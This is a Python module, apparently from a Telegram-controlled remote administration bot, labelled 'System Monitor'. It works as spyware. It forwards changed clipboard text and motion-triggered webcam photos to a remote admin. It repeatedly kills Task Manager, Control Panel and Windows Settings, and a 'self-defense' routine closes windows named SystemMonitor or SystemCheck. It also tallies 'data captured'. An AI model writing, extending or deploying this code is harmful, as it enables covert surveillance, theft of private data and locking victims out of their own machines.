"""
System Monitor Module
Optimized monitoring with debounce and resource management

Developer: TsByin
Version: 12.0
"""

import os
import time
import ctypes
import logging
import psutil
import cv2
from threading import Event, Thread
from datetime import datetime

logger = logging.getLogger(__name__)

# Windows Settings UWP class names — only these are the real Settings app
_WINDOWS_SETTINGS_CLASSES = frozenset([
    "ApplicationFrameWindow",  # Windows 10/11 UWP shell
])
_WINDOWS_SETTINGS_TITLES = frozenset([
    "settings", "cài đặt", "paramètres", "einstellungen", "configuración",
])
_BROWSER_EXE = frozenset([
    "chrome.exe", "msedge.exe", "firefox.exe", "opera.exe", "brave.exe",
    "vivaldi.exe", "iexplore.exe", "chromium.exe",
])

def _close_windows_settings_uwp():
    """Close ONLY the real Windows Settings UWP window (ApplicationFrameWindow),
    NOT browser settings/preferences pages which also have 'settings' in their title."""
    try:
        GetClassName = ctypes.windll.user32.GetClassNameW
        GetWindowText = ctypes.windll.user32.GetWindowTextW
        GetWindowTextLength = ctypes.windll.user32.GetWindowTextLengthW
        IsWindowVisible = ctypes.windll.user32.IsWindowVisible
        PostMessage = ctypes.windll.user32.PostMessageW
        WM_CLOSE = 0x0010

        def _enum_cb(hwnd, _):
            if not IsWindowVisible(hwnd):
                return True
            # Check window class name
            cls_buf = ctypes.create_unicode_buffer(256)
            GetClassName(hwnd, cls_buf, 256)
            cls = cls_buf.value

            if cls not in _WINDOWS_SETTINGS_CLASSES:
                return True  # Not a UWP ApplicationFrameWindow — skip

            # Confirm title contains a settings keyword
            length = GetWindowTextLength(hwnd)
            if length == 0:
                return True
            title_buf = ctypes.create_unicode_buffer(length + 1)
            GetWindowText(hwnd, title_buf, length + 1)
            title = title_buf.value.lower()

            if any(kw in title for kw in _WINDOWS_SETTINGS_TITLES):
                PostMessage(hwnd, WM_CLOSE, 0, 0)
                logger.info(f"Closed Windows Settings UWP: '{title_buf.value}'")
            return True

        CMPFUNC = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_int, ctypes.c_int)
        ctypes.windll.user32.EnumWindows(CMPFUNC(_enum_cb), 0)
    except Exception as e:
        logger.error(f"_close_windows_settings_uwp failed: {e}")

# ==============================================================================
# SYSTEM MONITOR CLASS
# ==============================================================================

class SystemMonitor:
    """Optimized system monitoring with graceful shutdown"""
    
    def __init__(self, admin_id, bot, config):
        self.admin_id = admin_id
        self.bot = bot
        self.config = config
        
        self.stop_event = Event()
        self.cap = None
        self.last_alerts = {}  
        self.block_mode_active = False
        self.taskmgr_locked = False
        self.intrusion_alert_active = False
        self.clipboard_monitor_active = False
        self._last_clipboard_text = None
        
        # Import utilities
        from utils import get_active_window_title, find_and_close_window
        self.get_active_window_title = get_active_window_title
        self.find_and_close_window = find_and_close_window
    
    def run(self):
        """Main monitoring loop"""
        logger.info("🟢 System monitor started")
        _clip_tick = 0
        
        while not self.stop_event.is_set():
            try:
                self._check_self_defense()
                self._check_blocked_apps(self.block_mode_active)
                self._check_taskmgr(self.taskmgr_locked)
                self._check_cpu_alert()
                self._check_intrusion_alert(self.intrusion_alert_active)
                # Clipboard monitor runs every ~3 seconds (3 loop ticks at 1s interval)
                _clip_tick += 1
                if self.clipboard_monitor_active and _clip_tick >= 3:
                    _clip_tick = 0
                    self._check_clipboard_monitor()
            except Exception as e:
                logger.error(f"Monitor loop error: {e}", exc_info=True)
            
            time.sleep(self.config.get('MONITOR_INTERVAL', 1))
        
        logger.info("🔴 System monitor stopped")
    
    def stop(self):
        """Graceful shutdown"""
        logger.info("Stopping system monitor...")
        self.stop_event.set()
        
        if self.cap is not None:
            try:
                self.cap.release()
            except:
                pass
            self.cap = None

    def update_flags(self, block_mode=None, taskmgr_locked=None, intrusion_alert=None, clipboard_monitor=None):
        """Update runtime flags controlled by UI commands"""
        if block_mode is not None:
            self.block_mode_active = block_mode
        if taskmgr_locked is not None:
            self.taskmgr_locked = taskmgr_locked
        if intrusion_alert is not None:
            self.intrusion_alert_active = intrusion_alert
        if clipboard_monitor is not None:
            self.clipboard_monitor_active = clipboard_monitor
            if not clipboard_monitor:
                self._last_clipboard_text = None
    
    def _check_self_defense(self):
        """Check and close detection windows"""
        try:
            active_title = self.get_active_window_title()
            if "SystemMonitor" in active_title or "SystemCheck" in active_title:
                self.find_and_close_window(["SystemMonitor", "SystemCheck"])
        except Exception as e:
            logger.debug(f"Self-defense check failed: {e}")
    
    def _check_blocked_apps(self, block_mode_active=False):
        """Kill blocked applications"""
        if not block_mode_active:
            return
        try:
            # Load blocked data at runtime from BLOCKED_FILE to avoid
            # importing a variable that may not exist in config when frozen.
            from config import BLOCKED_FILE
            from utils import load_blocked_list

            blocked_data = load_blocked_list(BLOCKED_FILE)
            blocked_apps = [a.lower() for a in blocked_data.get("apps", [])]
            blocked_tokens = set(blocked_apps)

            for proc in psutil.process_iter(['name', 'cmdline']):
                try:
                    pname = proc.info.get('name')
                    if not pname:
                        continue
                    p_name = pname.lower()
                    cmdline_list = proc.info.get('cmdline') or []
                    cmdline = " ".join(cmdline_list).lower()

                    # Always block TaskMgr if blocking is active
                    if p_name == "taskmgr.exe":
                        try:
                            proc.terminate()
                        except (psutil.NoSuchProcess, psutil.AccessDenied):
                            pass
                        logger.info("Terminated: taskmgr.exe")
                        continue

                    if p_name in blocked_apps:
                        try:
                            proc.terminate()
                        except (psutil.NoSuchProcess, psutil.AccessDenied):
                            pass
                        logger.info(f"Terminated blocked app: {p_name}")
                        continue

                    # If cmdline contains any blocked token (e.g., cpl opened via rundll32)
                    if any(tok in cmdline for tok in blocked_tokens):
                        try:
                            proc.terminate()
                            logger.info(f"Terminated by cmdline match: {p_name} ({cmdline})")
                        except (psutil.NoSuchProcess, psutil.AccessDenied):
                            pass
                        continue

                    # Special-case: control panel applets via rundll32
                    if "control.exe" in blocked_tokens and p_name == "rundll32.exe" and ".cpl" in cmdline:
                        try:
                            proc.terminate()
                            logger.info(f"Terminated Control Panel applet: {cmdline}")
                        except (psutil.NoSuchProcess, psutil.AccessDenied):
                            pass
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

            # Close control panel windows
            if "control.exe" in blocked_apps:
                self.find_and_close_window(["control panel", "bảng điều khiển"])

            if "systemsettings.exe" in blocked_apps:
                # Use class name 'ApplicationFrameWindow' to target only the real
                # Windows Settings UWP app — NOT browser settings pages
                _close_windows_settings_uwp()
        except Exception as e:
            logger.error(f"Block apps check failed: {e}", exc_info=True)
    
    def _check_taskmgr(self, taskmgr_locked=False):
        """Continuously lock TaskMgr if enabled"""
        if not taskmgr_locked:
            return
        
        try:
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] and proc.info['name'].lower() == "taskmgr.exe":
                    try:
                        proc.terminate()
                        logger.debug("TaskMgr terminated")
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        pass
        except Exception as e:
            logger.error(f"TaskMgr check failed: {e}", exc_info=True)
    
    def _check_cpu_alert(self):
        """Alert if CPU exceeds threshold"""
        try:
            cpu = psutil.cpu_percent(interval=0.5)
            threshold = self.config.get('CPU_ALERT_THRESHOLD', 95)
            cooldown = self.config.get('CPU_ALERT_COOLDOWN', 300)
            
            if cpu > threshold:
                last_alert = self.last_alerts.get('cpu', 0)
                current_time = time.time()
                
                if current_time - last_alert > cooldown:
                    try:
                        self.bot.send_message(self.admin_id, f"⚠️ **CPU CAO:** {cpu}%")
                        self.last_alerts['cpu'] = current_time
                        logger.info(f"CPU alert sent: {cpu}%")
                    except Exception as e:
                        logger.error(f"Send CPU alert failed: {e}")
        except Exception as e:
            logger.error(f"CPU check failed: {e}", exc_info=True)
    
    def _check_intrusion_alert(self, intrusion_alert_active=False):
        """Detect motion from webcam"""
        if not intrusion_alert_active:
            if self.cap is not None:
                try:
                    self.cap.release()
                except:
                    pass
                self.cap = None
            return
        
        try:
            if self.cap is None:
                self.cap = cv2.VideoCapture(0)
                if not self.cap.isOpened():
                    logger.warning("Webcam not available")
                    return
            
            ret1, frame1 = self.cap.read()
            if not ret1:
                logger.warning("Failed to read first frame")
                return
            
            time.sleep(0.3)
            ret2, frame2 = self.cap.read()
            if not ret2:
                logger.warning("Failed to read second frame")
                return
            
            # Motion detection
            diff = cv2.absdiff(frame1, frame2)
            gray = cv2.cvtColor(diff, cv2.COLOR_BGR2GRAY)
            blur = cv2.GaussianBlur(gray, (5, 5), 0)
            _, thresh = cv2.threshold(blur, 20, 255, cv2.THRESH_BINARY)
            dilated = cv2.dilate(thresh, None, iterations=3)
            contours, _ = cv2.findContours(dilated, cv2.RETR_TREE, cv2.CHAIN_APPROX_SIMPLE)
            
            # Alert on significant motion
            motion_area = self.config.get('MOTION_DETECT_AREA', 3000)
            if any(cv2.contourArea(c) > motion_area for c in contours):
                success, encoded_img = cv2.imencode('.jpg', frame1)
                if success:
                    try:
                        self.bot.send_photo(self.admin_id, encoded_img.tobytes(), 
                                          caption="🚨 PHÁT HIỆN CÓ NGƯỜI!")
                        logger.info("Intrusion alert sent")
                    except Exception as e:
                        logger.error(f"Send intrusion alert failed: {e}")
                
                time.sleep(self.config.get('MOTION_DETECT_COOLDOWN', 5))
        
        except Exception as e:
            logger.error(f"Intrusion check failed: {e}", exc_info=True)
            if self.cap:
                try:
                    self.cap.release()
                except:
                    pass
                self.cap = None

    def _check_clipboard_monitor(self):
        """Send alert when clipboard text changes"""
        try:
            from utils import get_clipboard_contents
            data = get_clipboard_contents()
            text = data.get("text") or ""
            if text and text != self._last_clipboard_text:
                self._last_clipboard_text = text
                preview = text[:500] + ("…" if len(text) > 500 else "")
                try:
                    self.bot.send_message(
                        self.admin_id,
                        f"📋 **Clipboard thay đổi:**\n```\n{preview}\n```",
                        parse_mode="Markdown"
                    )
                except Exception as e:
                    logger.error(f"Clipboard monitor send failed: {e}")
        except Exception as e:
            logger.debug(f"_check_clipboard_monitor error: {e}")

# ==============================================================================
# BOT STATISTICS
# ==============================================================================

class BotStats:
    """Track bot statistics"""

    def __init__(self):
        self.uptime_start = datetime.now()
        self.commands_executed = 0
        self.data_captured_mb = 0
        self._cached_cpu = 0.0
        self._cpu_cache_time = 0.0

    def increment_command(self):
        """Increment command counter"""
        self.commands_executed += 1

    def add_data_captured(self, size_mb):
        """Add to captured data size"""
        self.data_captured_mb += size_mb

    def _get_cpu(self):
        """B7 fixed: non-blocking CPU reading with 2-second cache"""
        now = time.time()
        if now - self._cpu_cache_time >= 2.0:
            self._cached_cpu = psutil.cpu_percent(interval=0)
            self._cpu_cache_time = now
        return self._cached_cpu

    def get_stats(self):
        """Get current statistics"""
        uptime = datetime.now() - self.uptime_start
        cpu = self._get_cpu()
        ram = psutil.virtual_memory().percent
        
        return {
            'uptime': str(uptime).split('.')[0],
            'cpu': cpu,
            'ram': ram,
            'commands': self.commands_executed,
            'data_mb': round(self.data_captured_mb, 2),
            'process_count': len(psutil.pids())
        }
    
    def get_stats_message(self):
        """Get formatted stats message"""
        stats = self.get_stats()
        return (
            f"📊 **THỐNG KÊ BOT**\n"
            f"⏱ Uptime: {stats['uptime']}\n"
            f"💻 CPU: {stats['cpu']}% | 💾 RAM: {stats['ram']}%\n"
            f"📡 Lệnh: {stats['commands']} | 📦 Dữ liệu: {stats['data_mb']}MB\n"
            f"🔄 Process: {stats['process_count']}"
        )

# ════════════════════════════════════════════════════════════
# Developer: TsByin
# Module: System Monitoring & Statistics Tracking (Background)
# Features: Debounced Alerts, Motion Detection, CPU Monitoring
# ════════════════════════════════════════════════════════════
